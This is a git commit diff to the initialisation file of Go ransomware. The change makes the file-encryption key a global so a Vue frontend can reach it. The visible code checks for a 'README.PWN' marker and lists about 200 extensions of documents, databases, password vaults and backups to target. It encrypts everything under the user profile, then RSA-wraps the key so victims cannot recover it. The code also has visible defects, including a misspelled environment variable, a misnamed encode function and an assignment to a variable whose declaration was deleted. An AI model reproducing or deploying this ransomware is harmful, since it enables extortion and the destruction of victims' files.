fb68fe5b2285c0b744147a8cc0461f344254f049
Kevin Romero <45984541+Kvn11@users.noreply.github.com>
2021-08-03 16:16:08 -0400

    Encrypt key is a global so it can be ref. in vue

--- initalize.go
+++ initalize.go
@@ -2,9 +2,13 @@ package main
 
 import (
 	"crypto/rand"
+	b64 "encoding/base64"
 	"fmt"
 	"os"
 )
+
+// Encryption key needs to be a global so we can reference it in the frontend
+var EncryptionKey []byte
 
 func isFirstTime() bool {
 	cookie := os.Getenv("USERPROFLE") + "\\Desktop\\" + "README.PWN"
@@ -12,6 +16,15 @@ func isFirstTime() bool {
 		return true
 	}
 	return false
+}
+
+func getEncryptedKey() []byte {
+	return EncryptionKey
+}
+
+func b64DecodeEncryptionKey(key []byte) string {
+	sEnc := b64.StdEncoding.EncodeToString(key)
+	return sEnc
 }
 
 func initialize() {
@@ -44,15 +57,15 @@ gwIDAQAB
 	targets := []string{".wb2", ".psd", ".p7c", ".p7b", ".p12", ".pfx", ".pem", ".crt", ".cer", ".der", ".pl", ".py", ".lua", ".css", ".js", ".asp", ".php", ".incpas", ".asm", ".hpp", ".h", ".cpp", ".c", ".7z", ".zip", ".rar", ".drf", ".blend", ".apj", ".3ds", ".dwg", ".sda", ".ps", ".pat", ".fxg", ".fhd", ".fh", ".dxb", ".drw", ".design", ".ddrw", ".ddoc", ".dcs", ".csl", ".csh", ".cpi", ".cgm", ".cdx", ".cdrw", ".cdr6", ".cdr5", ".cdr4", ".cdr3", ".cdr", ".awg", ".ait", ".ai", ".agd1", ".ycbcra", ".x3f", ".stx", ".st8", ".st7", ".st6", ".st5", ".st4", ".srw", ".srf", ".sr2", ".sd1", ".sd0", ".rwz", ".rwl", ".rw2", ".raw", ".raf", ".ra2", ".ptx", ".pef", ".pcd", ".orf", ".nwb", ".nrw", ".nop", ".nef", ".ndd", ".mrw", ".mos", ".mfw", ".mef", ".mdc", ".kdc", ".kc2", ".iiq", ".gry", ".grey", ".gray", ".fpx", ".fff", ".exf", ".erf", ".dng", ".dcr", ".dc2", ".crw", ".craw", ".cr2", ".cmt", ".cib", ".ce2", ".ce1", ".arw", ".3pr", ".3fr", ".mpg", ".jpeg", ".jpg", ".mdb", ".sqlitedb", ".sqlite3", ".sqlite", ".sql", ".sdf", ".sav", ".sas7bdat", ".s3db", ".rdb", ".psafe3", ".nyf", ".nx2", ".nx1", ".nsh", ".nsg", ".nsf", ".nsd", ".ns4", ".ns3", ".ns2", ".myd", ".kpdx", ".kdbx", ".idx", ".ibz", ".ibd", ".fdb", ".erbsql", ".db3", ".dbf", ".db-journal", ".db", ".cls", ".bdb", ".al", ".adb", ".backupdb", ".bik", ".backup", ".bak", ".bkp", ".moneywell", ".mmw", ".ibank", ".hbk", ".ffd", ".dgc", ".ddd", ".dac", ".cfp", ".cdf", ".bpw", ".bgt", ".acr", ".ac2", ".ab4", ".djvu", ".pdf", ".sxm", ".odf", ".std", ".sxd", ".otg", ".sti", ".sxi", ".otp", ".odg", ".odp", ".stc", ".sxc", ".ots", ".ods", ".sxg", ".stw", ".sxw", ".odm", ".oth", ".ott", ".odt", ".odb", ".csv", ".rtf", ".accdr", ".accdt", ".accde", ".accdb", ".sldm", ".sldx", ".ppsm", ".ppsx", ".ppam", ".potm", ".potx", ".pptm", ".pptx", ".pps", ".pot", ".ppt", ".xlw", ".xll", ".xlam", ".xla", ".xlsb", ".xltm", ".xltx", ".xlsm", ".xlsx", ".xlm", ".xlt", ".xls", ".xml", ".dotm", ".dotx", ".docm", ".docx", ".dot", ".doc", ".txt"}
 
 	publicRSAKey := savePublicKey(pubPEM)
-	encryptionKey := make([]byte, 32)
-	_, err := rand.Read(encryptionKey)
+	EncryptionKey = make([]byte, 32)
+	_, err := rand.Read(EncryptionKey)
 	checkError(err)
 
 	// Change the root directory. Only used this for testing.
-	files := EncryptSystem(os.Getenv("USERPROFILE"), targets, encryptionKey)
+	files := EncryptSystem(os.Getenv("USERPROFILE"), targets, EncryptionKey)
 
 	// Encrypt the key so that it can't be reversed.
-	encryptionKey = EncryptDataRSA(publicRSAKey, encryptionKey)
+	encryptionKey = EncryptDataRSA(publicRSAKey, EncryptionKey)
 	for _, f := range files {
 		fmt.Println(f)
 	}
